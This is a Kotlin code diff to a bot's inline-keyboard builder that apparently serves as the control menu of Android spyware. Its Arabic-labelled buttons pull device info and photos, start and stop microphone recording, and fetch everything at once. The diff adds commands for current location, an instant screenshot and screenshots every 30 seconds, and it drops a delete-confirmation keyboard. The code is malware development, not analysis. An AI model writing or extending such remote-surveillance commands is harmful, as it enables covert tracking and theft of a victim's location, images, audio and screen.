@@ -9,6 +9,7 @@ object KeyboardBuilder {
         val rows = JSONArray()
 
         rows.put(row(btn("📊 معلومات الجهاز", "info")))
+        rows.put(row(btn("📍 الموقع الحالي", "location")))
         rows.put(row(btn("📸 كل الصور", "photos_all")))
         rows.put(row(
             btn("📸 آخر 50", "photos_50"),
@@ -20,18 +21,14 @@ object KeyboardBuilder {
             btn("🎤 بدء التسجيل", "audio_start"),
             btn("⏹ إيقاف التسجيل", "audio_stop")
         ))
+        rows.put(row(btn("📷 لقطة شاشة الآن", "screen_once")))
+        rows.put(row(
+            btn("📷 لقطات كل 30s", "screen_loop_start"),
+            btn("🛑 إيقاف اللقطات", "screen_loop_stop")
+        ))
         rows.put(row(btn("🚀 جلب كل شي مع بعض", "fetch_all")))
         rows.put(row(btn("🔄 تحديث القائمة", "menu")))
 
-        return JSONObject().apply { put("inline_keyboard", rows) }
-    }
-
-    fun confirmDelete(): JSONObject {
-        val rows = JSONArray()
-        rows.put(row(
-            btn("✅ نعم", "confirm_yes"),
-            btn("❌ لا", "confirm_no")
-        ))
         return JSONObject().apply { put("inline_keyboard", rows) }
     }
 
